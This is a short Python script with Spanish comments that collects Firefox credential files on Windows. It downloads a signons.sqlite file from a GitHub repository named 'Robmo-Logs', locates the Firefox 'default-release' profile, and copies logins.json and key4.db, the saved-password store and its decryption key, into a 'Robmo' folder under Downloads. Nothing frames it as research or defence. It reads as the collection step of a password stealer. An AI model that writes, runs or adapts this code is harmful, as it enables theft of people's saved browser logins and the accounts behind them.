import os
import requests
import getpass
import shutil

def get_current_user():
    # Obtiene el nombre de usuario actual
    return getpass.getuser()

def download_signons_sqlite(username):
    # URL del archivo en GitHub
    github_url = "https://github.com/matiasb186/Robmo-Logs/raw/main/signons.sqlite"

    # Ruta de la carpeta de descargas del usuario
    downloads_folder = os.path.join("C:/Users", username, "Downloads")

    # Ruta completa de la carpeta "Robmo" en Descargas
    robmo_folder = os.path.join(downloads_folder, "Robmo")

    # Ruta completa del archivo a descargar
    file_path = os.path.join(robmo_folder, "signons.sqlite")

    # Verificar si la carpeta "Robmo" en Descargas existe, si no, crearla
    if not os.path.exists(robmo_folder):
        os.makedirs(robmo_folder)

    # Descargar el archivo desde GitHub y guardarlo en la carpeta "Robmo"
    response = requests.get(github_url)
    if response.status_code == 200:
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f'Archivo descargado en: {file_path}')
    else:
        print('Error al descargar el archivo.')

def find_firefox_profile(username):
    # Ruta al directorio de perfiles de Firefox en la ubicación proporcionada
    profiles_dir = os.path.join("C:/Users", username, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")

    # Buscar directorios con la palabra clave "default-release"
    for root, dirs, files in os.walk(profiles_dir):
        for profile in dirs:
            if 'default-release' in profile:
                return profile

    # Si no se encuentra el perfil, devolvemos None
    return None

def copy_firefox_files(username, profile_folder, destination_folder):
    # Ruta de origen para logins.json y key4.db
    source_folder = os.path.join("C:/Users", username, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile_folder)

    # Ruta completa de logins.json y key4.db en la carpeta de origen
    logins_json_path = os.path.join(source_folder, "logins.json")
    key4_db_path = os.path.join(source_folder, "key4.db")

    # Copiar logins.json y key4.db a la carpeta de destino
    shutil.copy(logins_json_path, os.path.join(destination_folder, "logins.json"))
    shutil.copy(key4_db_path, os.path.join(destination_folder, "key4.db"))

if __name__ == "__main__":
    # Descargar el archivo signons.sqlite
    username = get_current_user()
    download_signons_sqlite(username)

    # Encontrar y imprimir el nombre del perfil de Firefox con la palabra clave "default-release"
    firefox_profile = find_firefox_profile(username)
    if firefox_profile:
        print(f'Perfil de Firefox con palabra clave "default-release": {firefox_profile}')
        
        # Copiar logins.json y key4.db a la carpeta de destino (carpeta "Robmo")
        copy_firefox_files(username, firefox_profile, os.path.join("C:/Users", username, "Downloads", "Robmo"))
        print('Archivos logins.json y key4.db copiados a la carpeta "Robmo".')
    else:
        print('No se encontró un perfil "default-release" en Firefox en la ubicación proporcionada.')
